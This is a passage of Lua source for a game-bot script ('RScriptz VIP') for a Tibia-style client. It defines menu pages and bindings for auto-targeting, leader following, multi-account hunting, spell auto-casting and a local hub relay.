    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: AUTO-TARGET
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  BotSwitch
    id: tgtOn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 22
    !text: tr('Atacar monstruo mas cercano')

  Label
    id: tgtRngText
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: Rango: 5 tiles
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 8

  HorizontalScrollBar
    id: tgtRange
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 1
    maximum: 10
    step: 1
    height: 14
    margin-top: 2
]==]);  pcall(function() pTgt:hide() end)
    local pFol  = setupUI([==[
Panel
  id: pageFol
  height: 220

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: FOLLOW (leader)
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  BotSwitch
    id: folOn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 22
    !text: tr('Seguir a jugador (findPath)')

  Label
    id: folLdrLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Leader:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 8
    width: 60

  TextEdit
    id: folLeader
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 4
    editable: true
    focusable: true

  Label
    id: folDistText
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: Distancia max: 2
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 8

  HorizontalScrollBar
    id: folDist
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 1
    maximum: 8
    step: 1
    height: 14
    margin-top: 2
]==]);  pcall(function() pFol:hide() end)
    local pMch  = setupUI([==[
Panel
  id: pageMch
  height: 520

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MC HUNT (multi-cuenta)
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  BotSwitch
    id: mchIsLeader
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 22
    !text: tr('YO SOY EL LEADER')

  Label
    id: mchLdrLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Leader:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 8
    width: 60

  TextEdit
    id: mchLeader
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 4
    editable: true
    focusable: true

  Label
    id: mcSecHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === CONFIG DEL MC ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 10

  BotSwitch
    id: mchFollow
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 6
    height: 22
    !text: tr('MC sigue al leader (mismo piso)')

  BotSwitch
    id: mchCross
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 22
    !text: tr('MC cruza piso (escaleras/alcantarilla/rope)')

  BotSwitch
    id: mchShareTgt
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 22
    !text: tr('MC ataca el mismo target que leader')

  Label
    id: cmdSecHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === COMANDOS DEL LEADER ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 10

  Label
    id: cmdHint
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: (solo funcionan si sos LEADER)
    color: #8A8A8A
    font: verdana-11px-rounded
    height: 12
    margin-top: 2

  Label
    id: btnTravel
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 6
    height: 24
    text: [>] TRAVEL MC (elegir ciudad)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #1F3A1F
    focusable: true

  Label
    id: btnRefill
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 24
    text: [>] REFILL ALL (todos comprran)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #1F2A3A
    focusable: true

  Label
    id: btnSell
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 24
    text: [>] SELL ALL (todos venden loot)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #3A2A1F
    focusable: true

  Label
    id: btnHotkeys
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 24
    text: [>] HOTKEYS (asignar teclas)
    text-align: left
    text-offset: 12 0
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #2A1F3A
    focusable: true

  Label
    id: partySecHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === PARTY CHAT ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 10

  BotSwitch
    id: partyOn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 6
    height: 22
    !text: tr('Auto-party (aceptar/enviar invites)')
]==]);  pcall(function() pMch:hide() end)
    local pPk   = setupUI([==[
Panel
  id: pagePk
  height: 180

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: ANTI-PK
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  BotSwitch
    id: pkOn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 22
    !text: tr('Alertar players desconocidos')

  BotSwitch
    id: pkBroadcast
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 4
    height: 22
    !text: tr('Avisar a MCs por el hub')
]==]);   pcall(function() pPk:hide() end)
    local pHub  = setupUI([==[
Panel
  id: pageHub
  height: 220

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: HUB (conexion MCs)
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: canalLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Canal:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 8
    width: 60

  TextEdit
    id: canal
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4
    margin-right: 4
    editable: true
    focusable: true

  Button
    id: reconnect
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text: Reconectar al hub
    font: cipsoftFont
    color: #FFFFFF
    background-color: #2A2A2A
    height: 22
    margin-top: 8

  Label
    id: status
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: (estado)
    color: #2A2A2A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
]==]);  pcall(function() pHub:hide() end)

    -- PAGINA MODULOS VBOT (acceso a modulos nativos)
    local pMod = setupUI([==[
Panel
  id: pageMod
  height: 460

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: MODULOS VBOT (nativos)
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: hint
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: Prende/apaga los modulos nativos del bot desde aca
    color: #8A8A8A
    font: verdana-11px-rounded
    height: 14
    margin-top: 2

  BotSwitch
    id: swHealBot
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 20
    !text: tr('HealBot (vBot nativo)')

  BotSwitch
    id: swAttackBot
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('AttackBot (vBot nativo)')

  BotSwitch
    id: swCaveBot
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('CaveBot (vBot nativo)')

  BotSwitch
    id: swCombo
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('ComboBot (combos con leader)')

  BotSwitch
    id: swAnalyzer
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('Analyzer (loot/exp/hora)')

  BotSwitch
    id: swDropper
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('Dropper (drop tracker)')

  BotSwitch
    id: swAlarmas
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('Alarmas (bajo HP, PK, etc)')

  BotSwitch
    id: swAntiRs
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('Anti-RS (hide chars)')

  BotSwitch
    id: swHoldTgt
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('Hold Target (mantener boss)')

  BotSwitch
    id: swQuiver
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('Quiver Manager (auto flechas)')

  BotSwitch
    id: swPushMax
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('PushMax (mover monstruos)')
]==]);  pcall(function() pMod:hide() end)

    -- PAGINA UTILIDADES (XP Boost + Stamina + Blessings + notifs)
    local pUtil = setupUI([==[
Panel
  id: pageUtil
  height: 380

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: UTILIDADES
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: xpHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === XP BOOST AUTO ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 8

  BotSwitch
    id: xpOn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 6
    height: 20
    !text: tr('Auto-usar XP Boost cada 6h')

  BotItem
    id: xpItem
    anchors.top: prev.bottom
    anchors.left: parent.left
    margin-top: 4
    margin-left: 4
    size: 34 34

  Label
    id: xpTxt
    anchors.top: prev.top
    anchors.bottom: prev.bottom
    anchors.left: prev.right
    anchors.right: parent.right
    text-align: center
    text: (item de xp boost)
    color: #C8C8C8
    font: verdana-11px-rounded
    margin-left: 6

  Label
    id: staHdr
    anchors.top: xpItem.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === STAMINA WATCH ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 10

  BotSwitch
    id: staOn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 6
    height: 20
    !text: tr('Avisar al bajar de 14h stamina')

  Label
    id: notifHdr
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: === NOTIFICACIONES AL LEADER ===
    color: #D4AF37
    background-color: #1A1A1A
    font: verdana-11px-rounded
    height: 16
    margin-top: 10

  BotSwitch
    id: notifDeath
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 6
    height: 20
    !text: tr('MC muerto -> avisar al leader')

  BotSwitch
    id: notifLevel
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('MC level up -> avisar al leader')

  BotSwitch
    id: notifLoot
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 3
    height: 20
    !text: tr('MC lootea item raro -> avisar')
]==]);  pcall(function() pUtil:hide() end)


    -- ==================================================
    -- PAGINA SPELLS PRO (spells completos por vocacion)
    -- ==================================================
    local pSpro = setupUI([==[
Panel
  id: pageSpellsPro
  height: 548

  Button
    id: btnBack
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text: << Volver al menu
    font: cipsoftFont
    color: #FFFFFF
    background-color: #555555
    height: 22

  Label
    id: title
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: SPELLS POR VOCACION
    color: #D4AF37
    background-color: #232323
    font: verdana-11px-rounded
    height: 20
    margin-top: 4

  Label
    id: vocLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Vocacion:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 8
    width: 60

  ComboBox
    id: voc
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4

  Label
    id: hint
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: (los spells verdes se lanzan automatico segun mana y target)
    color: #8A8A8A
    font: verdana-11px-rounded
    height: 14
    margin-top: 6

  Panel
    id: content
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    margin-top: 6
    background-color: #1A1A1A
]==]);  pcall(function() pSpro:hide() end)

    -- Catalog completo por vocacion
    local CATALOG = {
        EK = {
            {name="BUFFS", spells={"utito tempo", "exeta res", "exeta amp res", }},
            {name="PVP", spells={"exori ico", "exori hur", "exori gran ico", "exori min", "exori", "exori gran", "exori mas", }},
        },
        RP = {
            {name="BUFFS", spells={"exana amp res", "utevo grav san", "exevo tempo mas san", "utito tempo san", }},
            {name="PVP", spells={"exevo mas san", "exori gran con", "exori con", "exori san", "exori mort", }},
            {name="NO PVP", spells={"divine missile", "divine caldera", }},
        },
        ED = {
            {name="BUFFS", spells={"utamo tempo mas res", "utani gran hur", }},
            {name="PVP", spells={"exevo gran mas frigo", "exevo gran mas tera", "exevo frigo hur", "exevo tera hur", "exori frigo", "exori tera", }},
            {name="NO PVP", spells={"exevo gran mas frigo (no-p)", "exevo gran mas tera (no-p)", }},
        },
        MS = {
            {name="BUFFS", spells={"utamo tempo mas res", "utani gran hur", }},
            {name="PVP", spells={"exevo gran mas flam", "exevo gran mas vis", "exevo vis hur", "exevo flam hur", "exori flam", "exori vis", "exori mort", "exori moe", }},
            {name="NO PVP", spells={"exevo gran mas flam (no-p)", "exevo gran mas vis (no-p)", }},
        },
        EM = {
            {name="BUFFS", spells={"utito tempo", }},
            {name="PVP", spells={"exori infir pug", "exori infir nia", "exori pug", "exori nia", "exori amp pug", "exori mas pug", "exori med pug", "exori gran mas pug", "exori gran pug", }},
        },
    }

    -- Estado de spells activados: storage["vip.spro.<voc>.<spellName>"] = true/false
    local sproVoc = C.get("vip.voc", "EK")
    C.ensure("vip.spro.voc", sproVoc)
    C.ensure("vip.spro.cd", 1500)

    -- Rellenar combo vocacion
    pcall(function()
        local vocList = {}
        for k in pairs(CATALOG) do vocList[#vocList+1] = k end
        table.sort(vocList)
        fillCombo(pSpro.voc, vocList, C.get("vip.spro.voc", "EK"))
    end)

    -- Funcion que rellena el content panel con los spells de la voc seleccionada
    local function refreshSpellsList()
        if not pSpro.content then return end
        pcall(function() pSpro.content:destroyChildren() end)
        local voc = C.get("vip.spro.voc", "EK")
        local secs = CATALOG[voc] or {}
        local prev
        for _, sec in ipairs(secs) do
            -- Header de seccion
            local hdr = g_ui.createWidget('Label', pSpro.content)
            pcall(function()
                hdr:setText("-- "..sec.name.." --")
                hdr:setTextAlign(AlignCenter)
                hdr:setColor("#D4AF37")
                hdr:setBackgroundColor("#252525")
                hdr:setHeight(16)
                if prev then hdr:addAnchor(AnchorTop, 'prev', AnchorBottom) else hdr:addAnchor(AnchorTop, 'parent', AnchorTop) end
                hdr:addAnchor(AnchorLeft, 'parent', AnchorLeft)
                hdr:addAnchor(AnchorRight, 'parent', AnchorRight)
                hdr:setMarginTop(4)
            end)
            prev = hdr
            -- Row por cada spell
            for _, spellName in ipairs(sec.spells) do
                local key = "vip.spro."..voc.."."..spellName
                local rowW = g_ui.createWidget('BotSwitch', pSpro.content)
                pcall(function()
                    rowW:setText(spellName)
                    rowW:setHeight(20)
                    if prev then rowW:addAnchor(AnchorTop, 'prev', AnchorBottom) end
                    rowW:addAnchor(AnchorLeft, 'parent', AnchorLeft)
                    rowW:addAnchor(AnchorRight, 'parent', AnchorRight)
                    rowW:setMarginTop(2)
                    rowW:setMarginLeft(2)
                    rowW:setMarginRight(2)
                    rowW:setOn(C.get(key, false) and true or false)
                    rowW.onClick = function(w)
                        local n = not C.get(key, false)
                        C.set(key, n); pcall(function() w:setOn(n) end)
                    end
                end)
                prev = rowW
            end
        end
    end

    refreshSpellsList()

    -- Cambio de vocacion refresca la lista
    pcall(function()
        pSpro.voc.onOptionChange = function(w)
            local o = w:getCurrentOption(); local t = o and o.text or nil
            if t then C.set("vip.spro.voc", t); refreshSpellsList() end
        end
    end)

    -- Volver al menu
    pcall(function() pSpro.btnBack.onClick = function() showPage("menu") end end)

    -- Macro que recorre los spells activados y castea el primero disponible
    local lastSproCast = 0
    macro(300, "RScriptz VIP: Spells PRO", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not _rqGetTarget() then return end
        local now = os.time() * 1000
        local cd = tonumber(C.get("vip.spro.cd", 1500)) or 1500
        if now - lastSproCast < cd then return end
        local voc = C.get("vip.spro.voc", "EK")
        local secs = CATALOG[voc] or {}
        for _, sec in ipairs(secs) do
            -- solo PVP para ataque auto (BUFFS y NO PVP se manejarian aparte)
            if sec.name == "PVP" then
                for _, spellName in ipairs(sec.spells) do
                    local key = "vip.spro."..voc.."."..spellName
                    if C.get(key, false) then
                        safeCast(spellName)
                        lastSproCast = now
                        return
                    end
                end
            end
        end
    end)

    RQ._vipPages = {menu=pMenu, cura=pCura, atk=pAtk, ex=pEx, tgt=pTgt, fol=pFol, mch=pMch, pk=pPk, hub=pHub, mod=pMod, util=pUtil, spro=pSpro}

    local function showPage(name)
        for k, p in pairs(RQ._vipPages) do
            pcall(function() if k == name then p:show() else p:hide() end end)
        end
    end

    -- ==================================================
    -- MENU: switches + botones que abren pagina
    -- ==================================================
    bindSwitch(pMenu.master, "vip.master", true)

    RQ.Scheduler.every("rq_vip_netlbl", 1000, function()
        if not pMenu.netLbl then return end
        pcall(function()
            if RQ.Net.conectado then
                pMenu.netLbl:setText("Net OK | "..RQ.Net.canal.." | tx="..RQ.Net.tx.." rx="..RQ.Net.rx)
                pMenu.netLbl:setColor("#32DC64")
            else
                pMenu.netLbl:setText("Net OFF (¿RQ_Hub.py corriendo?)")
                pMenu.netLbl:setColor("#2A2A2A")
            end
        end)
    end)

    -- Los "botones" del menu son Labels (para que acepten background-color
    -- en Mayas MEHAH). Los Labels no tienen onClick, usamos onMousePress.
    local function bindMenuBtn(w, pageName)
        if not w then return end
        pcall(function()
            w.onMousePress = function(_, _, button)
                -- button 1 = left click
                if button == 1 or button == nil then showPage(pageName) end
                return true
            end
        end)
        -- fallback por si onMousePress no funciona: onClick
        pcall(function() w.onClick = function() showPage(pageName) end end)
    end
    bindMenuBtn(pMenu.btnHub,  "hub")
    bindMenuBtn(pMenu.btnCura, "cura")
    bindMenuBtn(pMenu.btnAtk,  "atk")
    bindMenuBtn(pMenu.btnEx,   "ex")
    bindMenuBtn(pMenu.btnTgt,  "tgt")
    bindMenuBtn(pMenu.btnFol,  "fol")
    bindMenuBtn(pMenu.btnMch,  "mch")
    bindMenuBtn(pMenu.btnPk,   "pk")
    bindMenuBtn(pMenu.btnMod,  "mod")
    bindMenuBtn(pMenu.btnUtil, "util")
    bindMenuBtn(pMenu.btnSpro, "spro")

    -- Todos los "Volver" vuelven al menu
    for _, p in ipairs({pCura, pAtk, pEx, pTgt, pFol, pMch, pPk, pHub}) do
        pcall(function() p.btnBack.onClick = function() showPage("menu") end end)
    end

    -- ==================================================
    -- PAGINA CURACIONES (3 HP + 3 MP con toggle POT/SPELL)
    -- ==================================================
    local function bindCuraSlot(page, pfx, i, defItem, defPct, letra)
        local w = {
            on    = page[pfx..i.."on"],
            mode  = page[pfx..i.."mode"],
            item  = page[pfx..i.."item"],
            spell = page[pfx..i.."spell"],
            txt   = page[pfx..i.."txt"],
            pct   = page[pfx..i.."pct"],
        }
        bindSwitch(w.on, "vip."..pfx..i..".on", i==1)
        bindItem(w.item,  "vip."..pfx..i..".item", defItem)
        bindText(w.spell, "vip."..pfx..i..".spell", "")
        bindSlider(w.pct, w.txt, "vip."..pfx..i..".pct", defPct, letra.."<= %d%%")
        -- modo POT/SPELL: switch on = POT, off = SPELL
        local function refreshMode()
            local isPot = C.get("vip."..pfx..i..".mode", true) and true or false
            pcall(function() w.mode:setText(isPot and "POT" or "SPELL") end)
            pcall(function() w.mode:setOn(isPot) end)
            -- Ambos siempre visibles. El toggle solo cambia lo que USA el macro
            -- (POT = w.item, SPELL = w.spell). Evita bugs de layout en MEHAH.
        end
        refreshMode()
        pcall(function() w.mode.onClick = function()
            local isPot = not C.get("vip."..pfx..i..".mode", true)
            C.set("vip."..pfx..i..".mode", isPot)
            refreshMode()
        end end)
    end
    for i=1,3 do
        bindCuraSlot(pCura, "hp", i, defHp[i], defHpPct[i], "HP")
        bindCuraSlot(pCura, "mp", i, defMp[i], defMpPct[i], "MP")
    end

    -- UTILITY: Haste (combo con opciones por voc)
    bindSwitch(pCura.hasteOn, "vip.haste.on", false)
    fillCombo(pCura.hasteSpell, RQ.Catalog.hasteSpells[currentVoc] or {"utani hur"}, C.get("vip.haste.spell"))
    bindCombo(pCura.hasteSpell, "vip.haste.spell")
    -- Anti-Paralyze
    bindSwitch(pCura.aparOn, "vip.apar.on", false)
    -- Utamo (SPELL o RING segun toggle)
    bindSwitch(pCura.utamoOn, "vip.utamo.on", false)
    bindText(pCura.utamoSpell, "vip.utamo.spell", "utamo tempo")
    bindItem(pCura.utamoRing, "vip.utamo.ring", 3049)
    local function refreshUtamoMode()
        local isSpell = C.get("vip.utamo.mode", true) and true or false
        pcall(function() pCura.utamoMode:setText(isSpell and "SPELL" or "RING") end)
        pcall(function() pCura.utamoMode:setOn(isSpell) end)
        -- Ambos siempre visibles, el toggle solo cambia lo que USA el macro
    end
    refreshUtamoMode()
    pcall(function() pCura.utamoMode.onClick = function()
        local n = not C.get("vip.utamo.mode", true)
        C.set("vip.utamo.mode", n)
        refreshUtamoMode()
    end end)
    -- 3 Anillos + 3 Amuletos (cada uno con ID sin uso + ID activo)
    for i=1,3 do
        bindSwitch(pCura["ring"..i.."on"],  "vip.ring"..i..".on",  false)
        bindItem(pCura["ring"..i.."inv"],   "vip.ring"..i..".inv", 0)
        bindItem(pCura["ring"..i.."act"],   "vip.ring"..i..".act", 0)
        bindSwitch(pCura["neck"..i.."on"],  "vip.neck"..i..".on",  false)
        bindItem(pCura["neck"..i.."inv"],   "vip.neck"..i..".inv", 0)
        bindItem(pCura["neck"..i.."act"],   "vip.neck"..i..".act", 0)
    end

    -- ==================================================
    -- PAGINA SPELLS ATAQUE
    -- ==================================================
    local currentVoc = tostring(C.get("vip.voc") or "EK")
    local attackList = RQ.Catalog.attackSpells[currentVoc] or {}
    for i=1,3 do
        bindSwitch(pAtk["atk"..i.."on"], "vip.atk"..i..".on", false)
        fillCombo(pAtk["atk"..i.."spell"], attackList, C.get("vip.atk"..i..".spell"))
        bindCombo(pAtk["atk"..i.."spell"], "vip.atk"..i..".spell")
        bindSlider(pAtk["atk"..i.."cd"], pAtk["atk"..i.."txt"], "vip.atk"..i..".cd", 2000, "cada %d ms")
    end

    -- ==================================================
    -- PAGINA EXTRAS
    -- ==================================================
    for i=1,3 do
        bindSwitch(pEx["ex"..i.."on"], "vip.ex"..i..".on", false)
        bindText(pEx["ex"..i.."spell"], "vip.ex"..i..".spell", "")
        bindSlider(pEx["ex"..i.."cd"], pEx["ex"..i.."txt"], "vip.ex"..i..".cd", 5, "cada %d seg")
    end

    -- ==================================================
    -- PAGINA TARGET / FOLLOW / MC HUNT / ANTI-PK / HUB
    -- ==================================================
    bindSwitch(pTgt.tgtOn, "vip.tgt.on", false)
    bindSlider(pTgt.tgtRange, pTgt.tgtRngText, "vip.tgt.range", 5, "Rango: %d tiles")

    bindSwitch(pFol.folOn, "vip.fol.on", false)
    bindText(pFol.folLeader, "vip.fol.leader", "")
    bindSlider(pFol.folDist, pFol.folDistText, "vip.fol.dist", 2, "Distancia max: %d")

    bindSwitch(pMch.mchIsLeader, "vip.mch.isLeader", false)
    bindText(pMch.mchLeader, "vip.mch.leader", "")
    bindSwitch(pMch.mchFollow, "vip.mch.followSame", true)
    bindSwitch(pMch.mchCross, "vip.mch.crossFl", true)
    bindSwitch(pMch.mchShareTgt, "vip.mch.shareTgt", false)
    bindSwitch(pMch.partyOn, "vip.mch.party", false)

    -- =================================================
    -- COMANDOS DEL LEADER (Travel MC / Refill All / Sell All / Hotkeys)
    -- =================================================
    local TRAVEL_CITIES = {
        "Thais", "Venore", "Carlin", "Ab'Dendriel", "Kazordoon",
        "Ankrahmun", "Darashia", "Edron", "Liberty Bay", "Port Hope",
        "Svargrond", "Yalahar", "Farmine", "Rathleton", "Krailos",
        "Issavi", "Silvertides",
    }

    local function _leaderOnly(fn)
        return function()
            if not C.get("vip.mch.isLeader", false) then
                pcall(function() displayInfoBox("RScriptz",
                    "Solo el LEADER puede usar estos comandos.\n"..
                    "Activa 'YO SOY EL LEADER' arriba primero.") end)
                return
            end
            if not RQ.Net.conectado then
                pcall(function() displayErrorBox("RScriptz",
                    "El hub no esta conectado. Iniciate RQ_Hub.py y reconectate.") end)
                return
            end
            fn()
        end
    end

    -- TRAVEL MC: menu de ciudades -> broadcast a MCs
    local function bindLeaderBtn(w, fn)
        if not w then return end
        pcall(function() w.onMousePress = function(_, _, b) if b == 1 or b == nil then fn() end; return true end end)
        pcall(function() w.onClick = fn end)
    end

    bindLeaderBtn(pMch.btnTravel, _leaderOnly(function()
        local buttons = {}
        for _, city in ipairs(TRAVEL_CITIES) do
            buttons[#buttons+1] = {text = city, callback = function()
                RQ.Net.send("travel", {city = city})
                pcall(function() whiteInfoMessage("[RScriptz] Travel MC a "..city.." enviado a "..#RQ.Catalog.vocations.." MCs") end)
                -- el leader tambien viaja (self-dispara)
                pcall(function() say("hi") end)
                RQ.Scheduler.every("rq_leader_travel_1", 500, function()
                    pcall(function() say(city) end); RQ.Scheduler.remove("rq_leader_travel_1")
                end)
                RQ.Scheduler.every("rq_leader_travel_2", 1000, function()
                    pcall(function() say("yes") end); RQ.Scheduler.remove("rq_leader_travel_2")
                end)
            end}
            if #buttons >= 4 then break end   -- displayGeneralBox soporta max 4 botones
        end
        -- Como hay muchas ciudades y displayGeneralBox tiene limite,
        -- usamos client_textedit para que el leader escriba el nombre
        modules.client_textedit.show(nil, {
            title = "Travel MC",
            description = "Escribi la ciudad destino (ej: Thais, Venore, Carlin, Edron,\n"..
                          "Ankrahmun, Darashia, Kazordoon, Liberty Bay, Port Hope,\n"..
                          "Svargrond, Yalahar, Farmine, Rathleton, Krailos, Issavi):",
        }, function(city)
            if not city or city == "" then return end
            RQ.Net.send("travel", {city = city})
            pcall(function() whiteInfoMessage("[RScriptz] Travel a "..city.." enviado a MCs") end)
            -- self-dispara para el leader tambien
            pcall(function() say("hi") end)
            RQ.Scheduler.every("rq_leader_tr_1", 600, function()
                pcall(function() say(city) end); RQ.Scheduler.remove("rq_leader_tr_1")
            end)
